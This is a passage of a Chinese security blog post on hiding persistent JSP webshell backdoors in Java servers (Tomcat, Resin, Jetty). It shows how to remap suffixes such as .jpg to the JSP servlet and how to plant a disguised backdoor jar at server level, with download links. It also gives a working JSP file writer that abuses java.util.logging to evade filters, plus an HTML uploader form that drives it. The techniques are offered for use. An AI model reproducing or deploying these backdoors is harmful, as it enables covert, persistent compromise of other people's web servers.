+<pre><code>&lt;div class=&quot;main&quot;&gt; </code></pre>
+
+<pre><code>&#160; &lt;form id=&quot;fm&quot; method=&quot;post&quot;&gt;&#160;&#160; </code></pre>
+
+<pre><code>&#160;&#160;&#160; URL:&lt;input type=&quot;text&quot; value=&quot;http://localhost/Struts2/css3.jsp&quot; class=&quot;url&quot; id=&quot;url&quot; /&gt;&amp;nbsp;&amp;nbsp; </code></pre>
+
+<pre><code>&#160;&#160;&#160; FileName:&lt;input type=&quot;text&quot; name=&quot;f&quot; value=&quot;css.jsp&quot; class=&quot;fn&quot; id=&quot;fn&quot; /&gt;&amp;nbsp;&amp;nbsp; </code></pre>
+
+<pre><code>&#160;&#160;&#160; &lt;a href=&quot;javascript:upload();&quot;&gt;Upload&lt;/a&gt;&lt;br/&gt; </code></pre>
+
+<pre><code>&#160;&#160;&#160; &lt;textarea id=&quot;content&quot; class=&quot;content&quot; name=&quot;t&quot; &gt;&lt;/textarea&gt; </code></pre>
+
+<pre><code>&#160; &lt;/form&gt; </code></pre>
+
+<pre><code>&lt;/div&gt; </code></pre>
+
+<pre><code>&lt;/body&gt; </code></pre>
+
+<pre><code>&lt;/html&gt;</code></pre>
+
+<p><a href="http://xsser.me/caidao/getshell-by-logger.jsp" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.jsp</a></p>
+
+<p><a href="http://xsser.me/caidao/getshell-by-logger.txt" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.txt</a></p>
+
+<h4>0x03 jspf <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a></h4>
+
+<hr align="left" width="100%" noshade="noshade" size="2">
+
+<p>在 <a href="http://Ha.Cker.In/tag/Resin" target="_blank">Resin</a> 的配置文件conf/app-default.xml看到了几个可以用jsp方式去解析的后缀，其中就包含了jspf和上面的jspx： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image004.png" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="602" alt="clip_image004" src="http://img.cker.in/JavaWeb8_9E52/clip_image004_thumb.png" width="690" border="0"></a></p>
+
+<p>其中的resin-jsp和resin-jspx差不多，都是com.caucho.jsp.JspServlet处理，知识后者在init标签中标明了是以xml方式解析：<code>&lt;xml&gt;true&lt;/xml&gt;</code>。</p>
+
+<p>百度了下此jspf非框架（Java Simple Plugin Framework），JSP最新的规范已经纳入了jspf为JSP内容的文件。但是经过测试主流的JavaServer仅有resin和jetty支持，tomcat等server并不支持。不过在实际的生产环境上resin用的非常广泛。至于jetty略少，不过貌似bae是用的jetty。</p>
+
+<p>直接把css.jsp文件改名为1.jspf请求即可看到成功调用菜刀接口： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image005.png" target="_blank" rel="external"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="290" alt="clip_image005" src="http://img.cker.in/JavaWeb8_9E52/clip_image005_thumb.png" width="658" border="0"></a></p>
+
+<h4>0x04 邪恶后门第一式-恶意的任意后缀解析</h4>
+
+<hr align="left" width="100%" noshade="noshade" size="2">
+
+<p>从 <a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a> 和 <a href="http://Ha.Cker.In/tag/Resin" target="_blank">Resin</a> 的配置当中可以看出来，其实脚本可以是任意后缀，只要在配置解析的地方修改下映射的后缀就行了。那么只要修改下配置文件中后缀映射为jsp对于的解析的servlet名字就可以轻松的留下一个“不同寻常”的后缀的后门了。我测试Tomcat6/8和Resin3发现：一个运行当中的server当修改他们的映射的文件后不需要重启即可自动生效。也就是说可能一个网站存在跨目录的文件编辑漏洞，只要找到对于的配置文件地址修改后就能访问1.jpg去执行恶意的jsp脚本，这听起来有点让人不寒而栗。Getshell后只要把这配置文件一改丢个jpg就能做后门了。</p>
+
+<h5><a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a> 修改conf/web.xml：</h5>
+
+<p>￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image006.png" target="_blank" rel="external"><img title="clip_image006" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="301" alt="clip_image006" src="http://img.cker.in/JavaWeb8_9E52/clip_image006_thumb.png" width="1337" border="0"></a></p>
+
+<h5>Resin修改conf/app-default.xml：</h5>
+
+<p>￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image007.png" target="_blank" rel="external"><img title="clip_image007" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="232" alt="clip_image007" src="http://img.cker.in/JavaWeb8_9E52/clip_image007_thumb.png" width="1372" border="0"></a></p>
+
+<h4>0x05 邪恶第二式-“变态的server永久后门”</h4>
+
+<hr align="left" width="100%" noshade="noshade" size="2">
+
+<p>如果说修改某些不起眼的配置文件达到隐藏后门足够有意思的话，那么直接把后门“藏到Server里面”可能更隐蔽。</p>
+
+<p>在之前攻击Java系列教程中就已经比较详细的解释过Java的Server以及servlet和filter了。其实server启动跟启动一个app应用是非常相似的，我们需要做的仅仅是把servlet或者filter从应用层移动到server层，而且可以做到全局性。这种隐藏方法是极度残暴的，但是缺点是需要重启Server。假设在一台Server上部署了N个应用，访问任意一个应用都能获取Webshell。<a href="http://ip/xxx就是后门了。没明白？上demo。" target="_blank" rel="external">http://ip/xxx就是后门了。没明白？上demo。</a></p>
+
+<h5>Tomcat5配置方式：</h5>
+
+<p>在<code>apache-tomcat-5.5.27\conf\web.xml</code>的session-config后面加上一个filter或者servlet即可全局过滤：</p>
+
+<pre><code>&#160;&#160;&#160; &lt;servlet&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;HttpServletWrapper&lt;/servlet-name&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;javax.servlet.web.http.HttpServletWrapper&lt;/servlet-class&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;HttpServletWrapper&lt;/servlet-name&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;/servlet/HttpServletWrapper&lt;/url-pattern&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre>
+
+<p>url-pattern表示默认需要过滤的请求后缀。</p>
+
+<p>需要把jar复制到tomcat的lib目录，项目启动的时候会自动加载jar的filter或者filter。 ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image008.png" target="_blank" rel="external"><img title="clip_image008" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="210" alt="clip_image008" src="http://img.cker.in/JavaWeb8_9E52/clip_image008_thumb.png" width="896" border="0"></a></p>
+
+<p>Resin配置需要修改<code>E:\soft\resin-pro-3.1.13\conf\app-default.xml</code>，在resin-xtp的servler后面加上对应的filter或者servlet并把<code>E:\soft\resin-pro-3.1.13\lib</code>放入后门的jar包： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image009.png" target="_blank" rel="external"><img title="clip_image009" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="449" alt="clip_image009" src="http://img.cker.in/JavaWeb8_9E52/clip_image009_thumb.png" width="1339" border="0"></a></p>
+
+<p>Jetty配置，修改<code>D:\Soft\Server\jetty-distribution-9.0.5.v20130815\etc\webdefault.xml</code>文件，在default的servlet之前配置上面的filter和servler配置。</p>
+
+<p>Jar包：<code>E:\soft\jetty-distribution-9.0.4.v20130625\lib</code></p>
+
+<p>其他的Server就不列举了差不多。servlet和filter配置也都大同小异知道其中的一种就知道另一种怎么配置了。</p>
+
+<p>servlet-api-3.04.jar是我伪装的一个后门， jar下载地址：<a href="http://pan.baidu.com/s/17mKbH" target="_blank" rel="external">http://pan.baidu.com/s/17mKbH</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image011.png" target="_blank" rel="external"><img title="clip_image011" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image011" src="http://img.cker.in/JavaWeb8_9E52/clip_image011_thumb.png" width="193" border="0"></a></p>
+
+<p>对应的后门HttpServletWrapper.java下载地址：<a href="http://pan.baidu.com/s/1l8eiM" target="_blank" rel="external">http://pan.baidu.com/s/1l8eiM</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image013.png" target="_blank" rel="external"><img title="clip_image013" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image013" src="http://img.cker.in/JavaWeb8_9E52/clip_image013_thumb.png" width="193" border="0"></a></p>
+
+<h4>0x06 其他后门</h4>
+
+<hr align="left" width="100%" noshade="noshade" size="2">
+
+<h5>1、javabean</h5>
+
+<p><a href="http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar" target="_blank" rel="external">http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar</a></p>
+
+<p>用法：把beans.jsp传到网站根目录，把beans.class传到&quot;\webapp\WEB-INF\classes\linx&quot;目录。</p>
+
+<p>再访问</p>
+
+<p><a href="http://xxxxxx.com/webapp/beans.jsp?c=ls" target="_blank" rel="external">http://xxxxxx.com/webapp/beans.jsp?c=ls</a></p>
+
+<h5>2、servlet</h5>
+
+<p><a href="http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar" target="_blank" rel="external">http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image015.png" target="_blank" rel="external"><img title="clip_image015" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image015" src="http://img.cker.in/JavaWeb8_9E52/clip_image015_thumb.png" width="131" border="0"></a></p>
+
+<p>用法：把文件传到&quot;\webapp\WEB-INF\classes&quot;目录，访问</p>
+
+<p><a href="http://xxxxxx.com/webapp/servlet/servlets?c=ls" target="_blank" rel="external">http://xxxxxx.com/webapp/servlet/servlets?c=ls</a></p>
+
+<p>如果无法打开，请参考</p>
+
+<p><a href="http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx" target="_blank" rel="external">http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx</a></p>
+
+<p><b><a href="http://blog.csdn.net/larmy888/article/details/613920" target="_blank" rel="external">开启servlet调试器,在不修改web.xml文件的情况下也能运行servlet </a></b><b></b></p>
+
+<p>具体做法如下，在tomcat的根目录下，比如我的安转目录是D:/Apache Software Foundation/Tomcat 5.5找到conf文件夹下的web.xml文件.把其中如下的servlet和servlet-mapping元素注释去掉:<br>  <br>&lt;servlet&gt;<br><br>  <br>&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br><br>  <br>&lt;servlet-class&gt;<br><br>  <br>org.apache.catalina.servlets.InvokerServlet<br><br>  <br>&lt;/servlet-class&gt;<br><br>  <br>…<br><br>  <br>&lt;/servlet&gt;<br><br>  <br>…<br><br>  <br>&lt;servlet-mapping&gt;<br><br>  <br>&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br><br>  <br>&lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;<br><br>  <br>&lt;/servlet-mapping&gt;</p>
+
+<p>随着学习的深入，你会体会到这样带来的便利性，但不建议企业服务器这么做，仅限于学习阶段。</p>
+
+<p>测试servlet. 写好HelloServlet.java并编译.把HelloServlet.class拷贝至 tomcat主目录/webapps/ROOT/WEB-INF/classes(一般需要自己建一个classes文件夹)下,在浏览器地址栏输入<a href="http://localhost:port/servlet/HelloServlet" target="_blank" rel="external">http://localhost:port/servlet/HelloServlet</a> (这里可以看到开启servlet调试器的便利之处).</p>
+
+<h5>3、编译执行型后门</h5>
+
+<p>上传一个java文件编译并执行，通过socket方式可做后门。一般来说Server的loader在启动后不会再去加载新增的jar或者class文件，如果想自动加载新的class文件可能需要根据不同的Server去改配置。Tomcat下配置的时候经常有人会reloadable=&quot;true&quot;这样就有机会动态去加载class文件。可以根据Server去留一些有意思的后门。</p>
+
+<p><a href="http://xsser.me/caidao/getshell-by-logger.txt" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.txt</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image017.png" target="_blank" rel="external"><img title="clip_image017" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image017" src="http://img.cker.in/JavaWeb8_9E52/clip_image017_thumb.png" width="186" border="0"></a></p>
+
+<p>某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new File这样的方式去写文件，甚至是尽可能的不要出现File关键字。</p>
+
+<p>看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。</p>
+
+<p>java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。</p>
+
+<p>新建2.jsp并访问：</p>
+
+<p>&lt;%java.util.logging.Logger l=java.util.logging.Logger.getLogger(&quot;t&quot;);java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter(&quot;t&quot;));%&gt;</p>
+
+<p>访问菜刀shell正常输出: </p>
+
+<p>新生成的jsp文件在Server不重启情况下貌似无法直接删除，xxx.jsp.lck，锁了</p>
+
+<p>其实重点还是写文件，整理下上面的格式：</p>
+
+<p>&lt;% </p>
+
+<p>java.util.logging.Logger l = java.util.logging.Logger.getLogger(&quot;t&quot;); </p>
+
+<p>java.util.logging.FileHandler h = new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+ request.getParameter(&quot;f&quot;), true); </p>
+
+<p>h.setFormatter(new java.util.logging.SimpleFormatter()); </p>
+
+<p>l.addHandler(h); </p>
+
+<p>l.info(request.getParameter(&quot;t&quot;)); </p>
+
+<p>%&gt;</p>
+
+<p>其他略特殊点的文件读写Demo：</p>
+
+<p>new FileOutputStream </p>
+
+<p>new FileOutputStream(&quot;d:/sb.txt&quot;).write(new String(&quot;123&quot;).getBytes()); </p>
+
+<p>new DataOutputStream </p>
+
+<p>new DataOutputStream(new FileOutputStream(&quot;d:/1x.txt&quot;)).write(new String(&quot;123&quot;).getBytes()); </p>
+
+<p>FileWriter fw = new FileWriter(&quot;d:/3.txt&quot;); </p>
+
+<p>fw.write(&quot;21&quot;); </p>
+
+<p>fw.flush(); </p>
+
+<p>fw.close(); </p>
+
+<p>RandomAccessFile rf = new RandomAccessFile(&quot;d:/14.txt&quot;, &quot;rw&quot;); </p>
+
+<p>rf.write(new String(&quot;3b&quot;).getBytes()); </p>
+
+<p>rf.close();</p>
+
+<p>GetShell.htm:</p>
+
+<p>&lt;html&gt; </p>
+
+<p>&lt;head&gt; </p>
+
+<p>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; </p>
+
+<p>&lt;title&gt;jsp-yzmm&lt;/title&gt; </p>
+
+<p>&lt;/head&gt; </p>
+
+<p>&lt;style&gt; </p>
+
+<p>.main{width:980px;height:600px;margin:0 auto;} </p>
+
+<p>.url{width:300px;} </p>
+
+<p>.fn{width:80px;} </p>
+
+<p>.content{width:80%;height:60%;} </p>
+
+<p>&lt;/style&gt; </p>
+
+<p>&lt;script&gt; </p>
+
+<p>function upload(){ </p>
+
+<p>var url = document.getElementById(‘url’).value, </p>
+
+<p>content = document.getElementById(‘content’).value, </p>
+
+<p>fileName = document.getElementById(‘fn’).value, </p>
+
+<p>form = document.getElementById(‘fm’); </p>
+
+<p>if(url.length == 0){ </p>
+
+<p>alert(&quot;Url not allowd empty!&quot;); </p>
+
+<p>return ; </p>
+
+<p>} </p>
+
+<p>if(content.length == 0){ </p>
+
+<p>alert(&quot;Content not allowd empty!&quot;); </p>
+
+<p>return ; </p>
+
+<p>} </p>
+
+<p>if(fileName.length == 0){ </p>
+
+<p>alert(&quot;FileName not allowd empty!&quot;); </p>
+
+<p>return ; </p>
+
+<p>} </p>
+
+<p>form.action = url; </p>
+
+<p>form.submit(); </p>
+
+<p>} </p>
+
+<p>&lt;/script&gt; </p>
+
+<p>&lt;body&gt; </p>
+
+<p>&lt;div class=&quot;main&quot;&gt; </p>
+
+<p>&lt;form id=&quot;fm&quot; method=&quot;post&quot;&gt;</p>
+
+<p>URL:&lt;input type=&quot;text&quot; value=&quot;<a href="http://localhost/Struts2/css3.jsp&amp;quot" target="_blank" rel="external">http://localhost/Struts2/css3.jsp&amp;quot</a>; class=&quot;url&quot; id=&quot;url&quot; /&gt;&amp;nbsp;&amp;nbsp; </p>
+
+<p>FileName:&lt;input type=&quot;text&quot; name=&quot;f&quot; value=&quot;css.jsp&quot; class=&quot;fn&quot; id=&quot;fn&quot; /&gt;&amp;nbsp;&amp;nbsp; </p>
+
+<p>&lt;a href=&quot;javascript:upload();&quot;&gt;Upload&lt;/a&gt;&lt;br/&gt; </p>
+
+<p>&lt;textarea id=&quot;content&quot; class=&quot;content&quot; name=&quot;t&quot; &gt;&lt;/textarea&gt; </p>
+
+<p>&lt;/form&gt; </p>
+
+<p>&lt;/div&gt; </p>
+
+<p>&lt;/body&gt; </p>
+
+<p>&lt;/html&gt;</p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://id.cker.in/1043.seo/" data-id="cirz1r8r5000ka376not9x75r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/后门/">后门</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/菜刀/">菜刀</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/1044.seo/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          http-only型cookie截取及利用
+        
+      </div>
+    </a>
+  
+  
+    <a href="/946.seo/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">友情检测张柏芝官方网站全过程</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorier</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a></li><li class="category-list-item"><a class="category-list-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a></li><li class="category-list-item"><a class="category-list-link" href="/category/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/linux笔记/">linux笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/category/原创文章/">原创文章</a></li><li class="category-list-item"><a class="category-list-link" href="/category/影音娱乐/">影音娱乐</a></li><li class="category-list-item"><a class="category-list-link" href="/category/无线安全/">无线安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透工具、攻防视频/">渗透工具、攻防视频</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/category/疑难杂症/">疑难杂症</a></li><li class="category-list-item"><a class="category-list-link" href="/category/精品软件/">精品软件</a></li><li class="category-list-item"><a class="category-list-link" href="/category/絮叨碎语/">絮叨碎语</a></li><li class="category-list-item"><a class="category-list-link" href="/category/黑客技巧/">黑客技巧</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tag/net/">.net</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306/">12306</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂/">12306刷票外挂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂下载/">12306刷票外挂下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/1521/">1521</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3389/">3389</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3600safe/">3600safe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ACL/">ACL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/APT/">APT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP/">ASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP中FSO的神奇功能/">ASP中FSO的神奇功能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ATM/">ATM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript中shellcode的定位和提取/">ActionScript中shellcode的定位和提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript的反汇编和反编译/">ActionScript的反汇编和反编译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Acunetix-Web-Vulnerability-Scanner/">Acunetix Web Vulnerability Scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Anonymous/">Anonymous</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Apache/">Apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Armitage/">Armitage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Auditd/">Auditd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BDFProxy/">BDFProxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变异注入/">Base64变异注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变形注入/">Base64变形注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Beacon/">Beacon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Bettercap/">Bettercap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BlueStacks/">BlueStacks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Brup-Suite/">Brup Suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CANVAS/">CANVAS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CPanel/">CPanel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CSRF/">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CentOS/">CentOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Chrome/">Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Cobalt-Strike/">Cobalt Strike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ColdFusion/">ColdFusion</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Crack/">Crack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Csdn/">Csdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C段/">C段</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DDos/">DDos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DJ/">DJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DLL劫持漏洞/">DLL劫持漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS/">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS劫持/">DNS劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DRDoS/">DRDoS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Damn-Small-Linux/">Damn Small Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Debian/">Debian</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DedeCMS/">DedeCMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz/">Discuz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2-5/">Discuz!X2.5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2升级/">Discuz!X2升级</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESX/">ESX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESXi/">ESXi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exchange/">Exchange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FSO/">FSO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FTP/">FTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Facebook/">Facebook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FastCGI/">FastCGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Flash文件的提取/">Flash文件的提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Fuzzing/">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GEA翻墙/">GEA翻墙</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GWF/">GWF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Get-Shell/">Get Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Godaddy/">Godaddy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Google-Hack/">Google Hack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Group-By一个不常用的用法/">Group By一个不常用的用法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/HTML5/">HTML5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Hacking-Team/">Hacking Team</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Havij-1-152-Pro-最新破解版/">Havij 1.152 Pro 最新破解版</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Helen/">Helen</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Honeypot/">Honeypot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IISPY/">IISPY</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IIS写权限/">IIS写权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IPad/">IPad</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IPv6/">IPv6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/JDWP/">JDWP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kismet/">Kismet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kloxo/">Kloxo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LDAP/">LDAP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LNMP/">LNMP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LTM/">LTM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Linux-Mint/">Linux Mint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Lxadmin/">Lxadmin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MFP/">MFP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MS12-020/">MS12-020</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mattermost/">Mattermost</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MeeGo/">MeeGo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Memcached/">Memcached</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploitable/">Metasploitable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploit和armitage整合/">Metasploit和armitage整合</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mongodb/">Mongodb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/N900/">N900</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nessus/">Nessus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/NetHunter/">NetHunter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nginx平滑升级Tengine/">Nginx平滑升级Tengine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nodejs/">Nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/N点虚拟主机提权实例/">N点虚拟主机提权实例</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/OWASP/">OWASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Offensive-security/">Offensive security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Office-365/">Office 365</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Office365/">Office365</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/OpenVAS/">OpenVAS</a></li><li 